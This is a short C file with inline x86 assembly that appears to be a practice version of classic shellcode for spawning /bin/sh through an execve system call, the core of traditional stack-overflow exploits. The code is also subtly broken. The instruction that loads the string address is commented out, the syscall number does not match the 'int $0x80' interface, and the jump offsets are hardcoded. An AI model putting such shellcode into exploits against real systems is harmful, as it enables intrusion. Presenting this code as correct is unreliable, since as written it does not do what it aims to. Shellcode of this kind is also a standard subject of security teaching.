#include<stdio.h>
void main() {
__asm__(
    "jmp 0x2a\n"
    //"popl %esi\n"
    "movl %esi,0x8(%esi)\n"
    "movb $0x0,0x7(%esi)\n"
    "movl $0x0,0xc(%esi)\n"
    "movl $0x3b,%eax\n"
    "movl %esi,%ebx\n"
    "leal 0x8(%esi),%ecx\n"
    "leal 0xc(%esi),%edx\n"
    "int $0x80\n"
    "movl $0x1, %eax\n"
    "movl $0x0, %ebx\n"
    "int $0x80\n"
    "call -0x2f\n"
    ".string \"/bin/sh\"\n"
);
}